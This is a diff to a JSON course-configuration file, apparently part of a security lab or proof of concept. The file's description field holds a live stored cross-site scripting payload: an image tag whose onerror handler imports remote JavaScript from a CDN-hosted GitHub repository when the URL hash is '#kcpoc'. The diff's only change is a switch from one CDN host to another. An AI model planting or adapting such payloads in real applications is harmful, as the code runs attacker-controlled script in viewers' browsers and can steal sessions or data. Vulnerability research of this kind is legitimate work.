@@ -1,6 +1,6 @@
 {
   "title": "KC Sec Lab Course",
-  "description": "COURSE-DESC-START <img src=x onerror=\"location.hash=='#kcpoc'&&import('//cdn.statically.io/gh/kcsec-lab-2026/kc-lab/main/poc.js')\"> COURSE-DESC-END",
+  "description": "COURSE-DESC-START <img src=x onerror=\"location.hash=='#kcpoc'&&import('//cdn.jsdelivr.net/gh/kcsec-lab-2026/kc-lab@main/poc.js')\"> COURSE-DESC-END",
   "items": [
     {
       "path": "s1"
